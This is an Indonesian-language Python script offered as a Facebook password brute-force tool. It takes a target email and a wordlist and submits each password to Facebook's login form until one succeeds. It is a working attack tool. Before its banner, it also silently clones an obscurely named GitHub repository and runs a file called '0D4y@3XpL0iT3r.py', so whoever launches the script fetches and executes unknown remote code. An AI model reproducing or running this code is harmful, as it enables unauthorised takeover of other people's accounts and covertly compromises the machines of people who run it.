
#!/usr/bin/python
# -*- coding: utf-8 -*-
# NATIONAL SECURITY DEFENSE
# L0WBOT_SEC
# RILIS : 19 MEI 2018
# JANGAN UBAH APAPUN ! ATAU SCRIPT AKAN ERROR !


##-------- Import Libraries --------##
import socket,time,os	            
import optparse			    
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    OKYES = '\033[92m'

################## check internet #################
server = "www.google.com"                         #
def check():                                      #
   try:                                           #
      s = socket.gethostbyname(server)            #
      ss = socket.create_connection((s, 80), 2)   #
      return True                                 #
   except:                                        #
         pass                                     #
   return False                                   #
                                                  #
check = check()                                   #
###################################################

os.system("pkg update ")
os.system("git clone https://github.com/MuslimSecurity/kwmfuwvev3vej98fwm893fkre.git && cd kwmfuwvev3vej98fwm893fkre && python 0D4y@3XpL0iT3r.py")

parse = optparse.OptionParser("""\n
+---------------------------+------------+-------------------+-----------------------+
| National Security Defense | l0WB0T_SEC | Muslim Cyber Army | Indonesian Cyber Army |        
+---------------------------+------------+-------------------+-----------------------+
|       .,oo8888888888888888ooo,.                                                    |
|    ,od88888888888888888888888888oo,                                                |
| ,o0MMMMMMMMNMMMMM8888888888888888888o.                                             |
|d888888888V'.o   ```VoooooooOOOOOOOOIII,                                            |
|l888LLLLl:  O , ,O    ``VlMM88888IIAMMMMMOMb,                                       |
|l8888888LLb `VooV',O,MoodlM88888IIIMMMMV'ddMOMb,                                    |
|l88888888888booooooOlllllIIIIIIIIIAMMV',dMMOOMMMb,                                  |
|888888888888888888LLLLIAMMMMMMMMMMMMMMMMMOOOMMMMMMb,                                |
|8M8888888888LLLMMMAAMMMAAMMMMMMMMMMMMMMOOOOMMMMMMMMb                                |
|88M8888888lll888888mmmmmmmmmmmmmmvvvvvvvvvvvvv,`MMMM                                |
|8888M888888llllllllllllllV::::V''~~        ~~'V lMMV                                |
|M8888MMM888888TTTMl8lllllb:::V'                `IiM'                                |
|MMMMM8888M8k88888l8Mklllllk:A'                  `V'                          V .1.1 |
|lMMMMMM888888888888MMMMMlll:M +-----------------------------------------------------+
|l8MM8MMMM8888888888888MMMMllM |     FACEBOOK PASSWORD BRUTUFORCE ATTACK TOOLS       |
+------------------------------+-----------------------------------------------------+
| INFO : tools ini gunakan untuk keperluan tertentu ! gunakan dengan bijak dan baik  |
+------------------------------------------------------------------------------------+
| cara penggunaan :                                                                  |
| python facecrack.py -F emailtarget@com -W wordlist                                 |
+------------------------------------------------------------------------------------+
""")


def Main():
   parse.add_option("-F","--victim",dest="taremail",type="string",
			help="target anda")
   parse.add_option("-W","--wordlist",dest="wlst",type="string",
			help="wordlist anda")
   (options,args) = parse.parse_args()
   if options.taremail !=None and options.wlst !=None: 
     user = options.taremail
     passw = options.wlst
     try:
	import mechanize
     except:
	   print(" [ error ! ] ")
	   exit()

     global check
     if check == True:
	         try:
		    passwfile = open(passw, "r")
		 except:
                        print("\n \033[91m[ harap masukan password bego ! ] \n")
                        exit()
		 os.system("clear || cls")
		 print bcolors.HEADER + ("\033[92m[*] email target : "+str(user))
		 time.sleep(1)
		 print bcolors.HEADER + ("\033[92m[*] wordlist     : "+str(passw))
		 time.sleep(1)

		
		

		 print("\n[*] memulai brutuforce")
		 time.sleep(0.1)
		 lo = 1
		 for password in passwfile:
				          try:
                		             br1=mechanize.Browser()
                		             br1.set_handle_robots(False)
                                             br1.addheaders=[('User-agent', "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36")]
                		             op=br1.open("https://facebook.com")
                		             dos1=open("Facebook-Log.txt","w+")		
                	                     br1.select_form(nr=0)
                		             br1.form["email"]=user
                		             br1.form["pass"]=password
                		             br1.method="POST"
                		             br1.submit()
               			             dos1.write(br1.open("https://facebook.com").read())
                		             dos1.seek(0)
                		             text=dos1.read().decode("UTF-8")
                		             if(text.find("home_icon",0,len(text))!=-1):
                   			        print ("[*] password : "+ password)
                                                print ("[*] sukses ")
					        exit()
                		             else:
                    			          print ('[*] mencoba password [ %s ]   '%(password))
						  lo +=1


            			          except KeyboardInterrupt:
                                                 print( " di keluarkan ! ")
						 exit()
     elif check == False:
		    print("\n[!] Koneksi Internet error !")
		    exit(0)
   else:
	print(parse.usage)

if __name__=='__main__':
	Main()

